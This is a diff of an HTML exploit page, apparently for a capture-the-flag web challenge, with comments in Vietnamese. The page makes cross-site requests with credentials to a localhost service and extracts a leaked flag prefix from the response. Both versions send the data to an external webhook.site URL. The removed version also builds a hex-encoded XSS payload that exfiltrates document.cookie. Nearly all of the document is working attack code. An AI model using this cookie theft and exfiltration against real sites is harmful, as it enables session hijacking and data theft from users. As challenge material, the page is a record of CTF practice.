@@ -1,38 +1,29 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>Auto Guess Payload</title>
-</head>
+<html>
+<head><title>Leak Page</title></head>
 <body>
-  <h2>Auto Guess Payload Running...</h2>
-  <script>
+<script>
 (async () => {
-  // 1. Hex encode script bạn muốn chèn vào "note"
-  const payload = `
-    <img src=1 onerror="fetch('http://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?cookie=' + document.cookie)">
-  `.trim();
-
-  const hex = [...payload].map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
-
-  // 2. Gửi guess + note (hex)
-  await fetch("http://127.0.0.1:5000/guess", {
-    method: "POST",
-    credentials: "include",
-    headers: { "Content-Type": "application/json" },
+  // Gửi POST guess + note tới localhost để set cookie 'best'
+  await fetch('http://127.0.0.1:5000/guess', {
+    method: 'POST',
+    credentials: 'include',
+    headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      guess: "NHNC{",
-      note: hex
+      guess: 'NHNC{',
+      note: 'your_note_here' // note tùy ý, có thể để trống hoặc hex string
     })
   });
 
-  // 3. Sau đó load lại inner.html và lấy kết quả flag prefix
-  const res = await fetch("http://127.0.0.1:5000/inner.html", { credentials: "include" });
+  // Lấy nội dung /inner.html (có best-prefix chứa phần flag)
+  const res = await fetch('http://127.0.0.1:5000/inner.html', { credentials: 'include' });
   const html = await res.text();
-  const prefix = html.match(/<span id="best-prefix">(.*?)<\/span>/)?.[1] || 'no-match';
 
-  // 4. Leak ra ngoài
-  await fetch("http://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?prefix=" + encodeURIComponent(prefix));
+  // Dùng regex lấy best-prefix (đoạn flag bị leak)
+  const prefix = html.match(/<span id="best-prefix">(.*?)<\/span>/)[1];
+
+  // Gửi prefix ra webhook ngoài để bạn xem
+  await fetch('http://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?flag=' + encodeURIComponent(prefix));
 })();
 </script>
 </body>
